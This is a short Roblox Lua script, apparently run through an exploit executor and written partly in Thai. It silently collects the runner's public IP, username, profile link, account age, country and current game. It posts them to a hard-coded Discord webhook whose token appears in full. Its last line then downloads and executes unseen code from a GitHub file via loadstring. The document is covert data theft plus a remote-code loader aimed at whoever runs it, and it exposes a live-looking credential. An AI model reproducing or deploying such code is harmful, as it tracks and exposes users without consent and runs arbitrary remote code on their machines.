local hwid = "ไม่ได้ดัก"
local excutorcheck = "ไม่ได้ดัก"
local ip = tostring(game:HttpGet("https://api.ipify.org", true))
local GetName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
local url = "https://discordapp.com/api/webhooks/869544310381637642/_Kcd3KukxHo1DholkDvyLVncGd5Pigw5uWU36wmJzVpa6HpSn5yXha8DuQBhteLDbpB6"local data = {
   ["content"]= " ",
   ["embeds"]= {
    {
      ["title"]= "มีคนรันสคริป",
      ["color"]= 16761344,
      ["fields"]= {
        {
          ["name"]= "Player Name",
          ["value"]= game.Players.LocalPlayer.Name,
          ["inline"]= true
        },
        {
          ["name"]= "Player Profile",
          ["value"]= "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile",
          ["inline"]= true
        },
        {
          ["name"]= "Account Ages",
          ["value"]= game.Players.LocalPlayer.AccountAge,
          ["inline"]= true
        },
        {
          ["name"]= "Excutor",
          ["value"]= excutorcheck,
          ["inline"]= true
        },
        {
          ["name"]= "Game Name",
          ["value"]= GetName.Name,
          ["inline"]= true
        },
        {
          ["name"]= "Game Link",
          ["value"]= "https://roblox.com/games/"..game.PlaceId.."/",
          ["inline"]= true
        }
      },
      ["footer"]= {
        ["text"]= "IP : "..ip.."   |   HWID : "..hwid.."   |   ".."Country : "..game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(game.Players.LocalPlayer)
      }
    }
  },
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
loadstring(game:HttpGet("https://raw.githubusercontent.com/DevilXD99/-/main/README.md"))()
